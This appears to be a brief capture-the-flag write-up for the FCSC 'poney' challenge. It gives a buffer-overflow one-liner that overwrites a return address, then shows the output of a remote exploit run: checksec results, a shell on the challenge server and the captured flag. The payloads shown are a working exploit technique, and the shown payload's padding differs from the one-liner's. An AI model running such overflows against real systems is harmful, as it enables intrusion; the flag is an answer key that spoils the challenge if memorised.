Local: (python -c 'print "A"*32+"\x76\x06\x40\x00\x00\x00\x00\x00"';cat) | ./poney

Remote : 

```powershell
python poney.py
[*] '/home/elweth/Documents/FCSC/poney'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenges1.france-cybersecurity-challenge.fr on port 4000: Done
Give me the correct input, and I will give you a shell:
>>>
[*] payload : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv\x06\x00\x00\x00[*] Switching to interactive mode
 $ ls
flag
poney
$ cat flag
FCSC{725dd45f9c98099bcca6e9922beda74d381af1145dfce3b933512a380a356acf}
```
